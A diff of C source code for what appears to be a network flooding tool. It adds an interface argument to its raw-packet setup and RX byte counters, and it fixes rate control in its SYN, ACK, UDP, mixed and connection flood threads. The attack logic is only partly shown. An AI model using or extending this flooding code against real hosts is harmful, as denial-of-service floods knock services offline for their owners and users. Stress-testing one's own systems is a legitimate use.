@@ -95,17 +95,17 @@ uint16_t get_dest_syn_port()
 }
 
 void recalculate_sleep_interval(int pps) {
-    /* tries to adjust a new sleep_interval */
-    if(pps_output > 0) {
-        float error_percent = (pps - pps_output) / (float)pps_output;
+    if(pps == 0 || pps_output == 0)
+        return;
 
-        float margin = fabs(error_percent) * sleep_interval;
-        if(margin >= 1.0f) {
-            int new_sleep_interval = sleep_interval + ceilf(sleep_interval * error_percent);
-            new_sleep_interval = MAX(new_sleep_interval, 0);
-            new_sleep_interval = MIN(new_sleep_interval, 1000000);
-            sleep_interval = new_sleep_interval;
-        }
+    /* tries to adjust a new sleep_interval */
+    float error_percent = (pps - pps_output) / (float)pps_output;
+    float margin = fabs(error_percent) * sleep_interval;
+    if(margin >= 1.0f) {
+        int new_sleep_interval = sleep_interval + ceilf(sleep_interval * error_percent);
+        new_sleep_interval = MAX(new_sleep_interval, 0);
+        new_sleep_interval = MIN(new_sleep_interval, 1000000);
+        sleep_interval = new_sleep_interval;
     }
 }
 
@@ -113,7 +113,7 @@ void recalculate_sleep_interval(int pps) {
 void *conn_flood_attack_thread(void *param)
 {
     struct leef_handle leef;
-    if(!leef_init(&leef, INJECTING))
+    if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
     uint16_t src_port = leef_random_src_port();
@@ -153,7 +153,7 @@ typedef struct {
 void conn_flood_sniff_thread()
 {
     struct leef_handle leef;
-    if(!leef_init(&leef, SNIFFING_AND_INJECTING))
+    if(!leef_init(&leef, interface, SNIFFING_AND_INJECTING))
         return;
     leef_set_sniff_packet_size(&leef, 64);
 
@@ -174,6 +174,7 @@ void conn_flood_sniff_thread()
     int alive_connections = 0;
     int new_connections = 0;
     int tx_bytes = 0;
+    int rx_bytes = 0;
     long long total_syn_sent = 0;
     long long total_synack_received = 0;
     long long total_rst_received = 0;
@@ -182,6 +183,7 @@ void conn_flood_sniff_thread()
     long long total_ack_received = 0;
     long long total_new_connections = 0;
     long long total_tx_bytes = 0;
+    long long total_rx_bytes = 0;
     double connections_fail;
     leef_sniffed_packet packet;
     tcp_queue_entry *packets_queue = malloc(sizeof(tcp_queue_entry) * MAX_PACKETS_QUEUE);
@@ -203,6 +205,15 @@ void conn_flood_sniff_thread()
                 queue_packet = &packets_queue[i];
                 if(queue_packet->send_ticks == 0xffffffff || ticks_now < queue_packet->send_ticks)
                     continue;
+
+                if(queue_packet->flags & TCP_RST) {
+                    if(conn_ports[queue_packet->src_port] == 1) {
+                        conn_ports[queue_packet->src_port] = 0;
+                        alive_connections--;
+                    } else
+                        continue;
+                }
+
                 leef_send_raw_tcp2(&leef,
                                     queue_packet->src_addr, queue_packet->dest_addr,
                                     queue_packet->src_port, queue_packet->dest_port,
@@ -211,11 +222,6 @@ void conn_flood_sniff_thread()
                                     0,
                                     NULL);
                 tx_bytes += 54;
-
-                if(queue_packet->flags & TCP_RST && conn_ports[queue_packet->src_port] == 1) {
-                    conn_ports[queue_packet->src_port] = 0;
-                    alive_connections--;
-                }
 
                 queue_packet->send_ticks = 0xffffffff;
             }
@@ -232,12 +238,13 @@ void conn_flood_sniff_thread()
             total_ack_received += ack_received;
             total_new_connections += new_connections;
             total_tx_bytes += tx_bytes;
+            total_rx_bytes += rx_bytes;
 
             if(!running)
                 break;
 
             if(!quiet) {
-                printf("SYN=%d/s SA=%d/s RA=%d/s FA=%d/s PA=%d/s A=%d/s NEW=%d/s FAIL=%d/s ALIVE=%d TX=%.02f Kbps\n",
+                printf("SYN=%d/s SA=%d/s RA=%d/s FA=%d/s PA=%d/s A=%d/s NEW=%d/s FAIL=%d/s ALIVE=%d TX=%.02f Kbps RX=%.02f Kbps\n",
                     syn_sent,
                     synack_received,
                     rst_received,
@@ -247,7 +254,8 @@ void conn_flood_sniff_thread()
                     new_connections,
                     MAX(syn_sent - new_connections, 0),
                     alive_connections,
-                    (tx_bytes * 8)/1000.0f);
+                    (tx_bytes * 8)/1000.0f,
+                    (rx_bytes * 8)/1000.0f);
                 fflush(stdout);
             }
 
@@ -261,6 +269,7 @@ void conn_flood_sniff_thread()
             syn_sent = 0;
             new_connections = 0;
             tx_bytes = 0;
+            rx_bytes = 0;
             last_ticks = ticks_now;
         }
 
@@ -273,6 +282,7 @@ void conn_flood_sniff_thread()
                 if(packet.in_ip.tcp->ack == 1 &&
                    action_uuid != ((packet.in_ip.tcp->ack_seq & 0xff000000) >> 24))
                     continue;
+                rx_bytes += packet.len;
                 src_port = packet.in_ip.tcp->dest;
                 /* SYN+ACK */
                 if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
@@ -539,7 +549,7 @@ void interface_traffic_thread()
 void *syn_flood_attack_thread(void *param)
 {
     struct leef_handle leef;
-    if(!leef_init(&leef, INJECTING))
+    if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
     while(running) {
@@ -560,7 +570,7 @@ void *syn_flood_attack_thread(void *param)
 void *ack_flood_attack_thread(void *param)
 {
     struct leef_handle leef;
-    if(!leef_init(&leef, INJECTING))
+    if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
     while(running) {
@@ -580,7 +590,7 @@ void *ack_flood_attack_thread(void *param)
 void *udp_flood_attack_thread(void *param)
 {
     struct leef_handle leef;
-    if(!leef_init(&leef, INJECTING))
+    if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
     while(running) {
@@ -601,7 +611,7 @@ void *udp_flood_attack_thread(void *param)
 void *mix_flood_attack_thread(void *param)
 {
     struct leef_handle leef;
-    if(!leef_init(&leef, INJECTING))
+    if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
     while(running) {
@@ -647,7 +657,7 @@ void *mix_flood_attack_thread(void *param)
 void *mix2_flood_attack_thread(void *param)
 {
     struct leef_handle leef;
-    if(!leef_init(&leef, INJECTING))
+    if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
     while(running) {
@@ -686,7 +696,7 @@ void *mix2_flood_attack_thread(void *param)
 void *pa_flood_attack_thread(void *param)
 {
     struct leef_handle leef;
-    if(!leef_init(&leef, INJECTING))
+    if(!leef_init(&leef, interface, INJECTING))
         return NULL;
 
     while(running) {
@@ -708,7 +718,7 @@ void *pa_flood_attack_thread(void *param)
 void *tcp_ping_thread(void *param)
 {
     struct leef_handle leef;
-    if(!leef_init(&leef, SNIFFING_AND_INJECTING))
+    if(!leef_init(&leef, interface, SNIFFING_AND_INJECTING))
         return NULL;
     leef_set_sniff_packet_size(&leef, 128);
 
